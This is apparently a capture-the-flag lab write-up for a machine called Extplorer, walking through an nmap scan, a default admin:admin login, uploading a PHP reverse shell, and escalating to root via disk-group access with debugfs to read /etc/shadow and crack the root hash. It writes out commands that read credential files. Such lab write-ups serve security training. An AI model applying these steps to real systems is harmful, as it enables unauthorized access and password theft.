---
icon: ubuntu
---

# Extplorer - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.16 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 12:00 EDT                                                                                     
Nmap scan report for 192.168.118.16                                                                                                                 
Host is up (0.029s latency).                                                                                                                        
Not shown: 65533 filtered tcp ports (no-response)                                                                                                   
PORT   STATE SERVICE VERSION                                                                                                                        
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                   
| ssh-hostkey:                                                                                                                                      
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)                                                                                      
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)                                                                                     
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)                                                                                   
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                 
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                        
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                               
Device type: general purpose|router                                                                                                                 
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)                                                                 
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0                                                                                      
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.15 (90%)       
No exact OS matches for host (test conditions non-ideal).                                                                                           
Network Distance: 4 hops                                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                             
                                                                                                                                                    
TRACEROUTE (using port 22/tcp)                                                                                                                      
HOP RTT      ADDRESS                                                                                                                                
1   27.45 ms 192.168.45.1                                                                                                                           
2   27.44 ms 192.168.45.254                                                                                                                         
3   28.19 ms 192.168.251.1                                                                                                                          
4   28.40 ms 192.168.118.16
```

### <mark style="color:$primary;">HTTP Port 80 Tcp</mark>

<figure><img src="../../.gitbook/assets/image (2094).png" alt=""><figcaption></figcaption></figure>

I am going to do some directory busting, see if I can find anything interesting:

```
feroxbuster -uhttp://192.168.118.16/
```

<figure><img src="../../.gitbook/assets/image (2095).png" alt=""><figcaption></figcaption></figure>

![](<../../.gitbook/assets/image (2096).png>)

admin:admin works!

<figure><img src="../../.gitbook/assets/image (2097).png" alt=""><figcaption></figcaption></figure>

I should be able to modify a php script and get a reverse shell on the box

### <mark style="color:$primary;">File Upload Vulnerability</mark>

I am going to use revshells.com to generate a php reverse shell

<figure><img src="../../.gitbook/assets/image (2098).png" alt=""><figcaption></figcaption></figure>

I am going to create a new file inside of filemanager directory and paste my reverse shell code:

<figure><img src="../../.gitbook/assets/image (2099).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2100).png" alt=""><figcaption></figcaption></figure>

Now we can setup or listener and visit the address to get a rev shell

<figure><img src="../../.gitbook/assets/image (2101).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2102).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

I ran linpeas and skimmed through it first, but did not find anything interesting. So I went and looked for some creds in /var/www/html

```
grep 'sh$' /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (2103).png" alt=""><figcaption></figcaption></figure>

```
grep -r dora 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (2104).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2105).png" alt=""><figcaption></figcaption></figure>

I am going to save the hash and try to crack it

```
john dora.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2084).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2085).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Disk Group Privesc</mark>

<figure><img src="../../.gitbook/assets/image (2087).png" alt=""><figcaption></figcaption></figure>

dora is in the disk group, Sweet!!!! Let's find the root directory

```
df -h
```

<figure><img src="../../.gitbook/assets/image (2088).png" alt=""><figcaption></figcaption></figure>

`/dev/mapper/ubuntu—vg-ubuntu—lv`. Let’s move to the second step.

```
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
```

Once we get in there, we try to create a file `mkdir test` but permission denied. However, we can read file locate at /root.

<figure><img src="../../.gitbook/assets/image (2089).png" alt=""><figcaption></figcaption></figure>

we can still try to read root's ssh key!

```
cat /root/.ssh/id_rsa
```

<figure><img src="../../.gitbook/assets/image (2090).png" alt=""><figcaption></figcaption></figure>

Since we can’t find a SSH private key at root folder, let try our luck with `/etc/shadow`

```
cat /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (2091).png" alt=""><figcaption></figcaption></figure>

Great, we obtain root's hash. Let’s try if we can crack it. Copy the hash root:$6$……..7::: and save it to a file

```
john root.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2092).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2093).png" alt=""><figcaption></figcaption></figure>

We made it to root!&#x20;
